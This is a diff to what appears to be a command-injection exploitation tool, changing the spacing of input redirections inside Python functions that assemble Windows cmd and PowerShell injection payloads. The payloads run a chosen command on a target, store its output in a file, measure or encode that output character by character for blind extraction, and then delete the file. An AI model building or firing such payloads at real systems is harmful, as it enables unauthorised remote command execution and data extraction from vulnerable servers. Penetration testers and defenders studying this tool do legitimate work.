@@ -209,7 +209,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + " <nul" + pipe + " "
+                ">" + OUTPUT_TEXTFILE + "< nul" + pipe + " "
                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
@@ -218,7 +218,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 pipe + " "
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"') "
-                "do @set /p =%i>" + OUTPUT_TEXTFILE + "<nul) "
+                "do @set /p =%i>" + OUTPUT_TEXTFILE + "< nul) "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
     if separator == "&&" :
@@ -231,7 +231,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                "for /f \"delims=\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + " <nul" + ampersand + ""
+                ">" + OUTPUT_TEXTFILE + "< nul" + ampersand + ""
                 "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 "do if %i==" +str(j) + " "
@@ -240,7 +240,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
                 ampersand + ""
                 "for /f \"delims=\" %i in ('cmd /c \"" +
                 "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + ")))\"') "
-                "do @set /p =%i>" + OUTPUT_TEXTFILE + "<nul) "
+                "do @set /p =%i>" + OUTPUT_TEXTFILE + "< nul) "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -324,7 +324,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"delims=\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + " <nul " + pipe + " "
+                ">" + OUTPUT_TEXTFILE + "< nul " + pipe + " "
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
@@ -341,7 +341,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"delims=\" %i in ('cmd /c " +
                 cmd + 
                 "') do @set /p =%i" +
-                ">" + OUTPUT_TEXTFILE + " <nul " + ampersand + ""
+                ">" + OUTPUT_TEXTFILE + "< nul " + ampersand + ""
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
